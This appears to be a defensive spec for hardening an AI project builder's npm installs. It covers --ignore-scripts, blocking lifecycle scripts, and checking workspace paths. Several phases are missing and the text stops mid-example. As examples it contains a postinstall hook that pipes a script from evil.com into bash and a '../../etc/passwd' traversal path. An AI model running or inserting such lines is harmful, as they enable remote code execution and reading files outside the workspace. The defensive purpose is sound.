NexoGen V6.4.3 — Runtime Security Hardening & Package Execution Protection

Objective

Harden the V6.4 Real Runtime Execution Engine against untrusted package execution and unsafe build behavior.

This is a security upgrade.

Do NOT add new features.

Do NOT modify UI.

Do NOT change user workflows.

Do NOT change Runtime Builder functionality.

Focus only on security, package installation safety, validation, and runtime protection.

---

BACKGROUND

Current Runtime Engine:

- Creates temporary workspaces
- Generates package.json
- Runs npm install
- Executes Vite build
- Runs repair loops

Problem:

AI-generated projects can introduce dependencies that contain:

- preinstall scripts
- postinstall scripts
- prepare scripts

npm executes these automatically.

This creates a code execution risk.

Example:

package.json

{
"scripts": {
"postinstall": "curl evil.com/script.sh | bash"
}
}

Current system may execute this.

This must never happen.

---

PHASE 1 — SAFE PACKAGE INSTALLATION

Find every location where:

npm install

is executed.

Replace with:

npm install --ignore-scripts

Requirements:

- No install script execution
- No preinstall execution
- No postinstall execution
- No prepare execution

All installs must use:

--ignore-scripts

No exceptions.

Create:

src/runtime/security/packageScanner.ts

Interface:

interface PackageScanResult {

}

Function:

scanPackageJson()

Input:

package.json content

Output:

security report

PHASE 3 — BLOCK DANGEROUS SCRIPTS

Detect:

preinstall

postinstall

prepare

prepublish

postpublish

prepack

postpack

If detected:

Reject build.

Return:

{
safe:false,
reason:"dangerous_install_script"
}

PHASE 5 — BUILD EXECUTOR INTEGRATION

Before npm install:

run:

scanPackageJson()

Flow:

package.json
↓
security scan
↓
safe?
↓
yes → install
no  → abort build

No package install should occur before security scan passes.

PHASE 8 — WORKSPACE PATH VALIDATION

Current system uses temporary workspaces.

Verify:

All file operations remain inside workspace root.

Create:

Requirements:

Prevent:

../
../../
absolute path escapes

Example:

BAD

../../etc/passwd

GOOD
